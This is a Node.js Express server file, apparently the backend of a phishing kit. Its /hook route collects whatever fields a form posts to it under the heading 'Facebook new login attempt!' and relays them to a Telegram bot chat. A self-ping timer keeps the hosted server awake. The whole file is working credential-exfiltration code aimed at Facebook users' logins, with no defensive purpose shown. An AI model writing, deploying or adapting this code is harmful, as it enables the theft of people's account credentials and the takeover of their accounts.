const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

// Soma env vars
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

if (!botToken || !chatId) {
  console.error("BOT_TOKEN or CHAT_ID is missing in environment variables!");
  process.exit(1); // stop server kama env hazipo
}

app.use(cors());
app.use(bodyParser.json());

// Keep alive route
app.get("/", (req, res) => {
  res.send("Server is alive!");
});

// Telegram send route
app.post("/hook", async (req, res) => {
  const data = req.body;

  let message = "📲 Facebook new login attempt!\n\n";
  for (let key in data) {
    message += `${key.toUpperCase()}: ${data[key]}\n`;
  }

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    });

    res.status(200).json({ status: "success" });
  } catch (err) {
    console.error("Telegram error:", err.message);
    res.status(500).json({ status: "error", message: "Telegram failed" });
  }
});

// Self-ping to keep server awake
setInterval(() => {
  axios.get("https://web-server-ee1r.onrender.com/")
    .then(() => console.log("Self-ping successful"))
    .catch((err) => console.log("Self-ping failed", err.message));
}, 1000 * 60 * 14); // 14 mins

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
